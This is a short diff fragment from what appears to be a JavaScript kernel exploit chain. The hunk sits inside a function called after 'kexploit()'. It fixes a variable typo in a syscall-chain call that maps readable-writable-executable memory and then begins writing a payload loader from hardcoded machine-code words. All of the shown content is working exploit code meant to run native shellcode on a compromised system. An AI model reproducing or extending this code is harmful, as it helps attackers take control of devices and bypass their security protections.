@@ -1763,7 +1763,7 @@ kexploit().then(() => {
         return ptr;
     }
 
-    var payload_buffer = cchain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+    var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
     var payload_loader = malloc32(0x1000);
     var BLDR = payload_loader.backing;
     BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
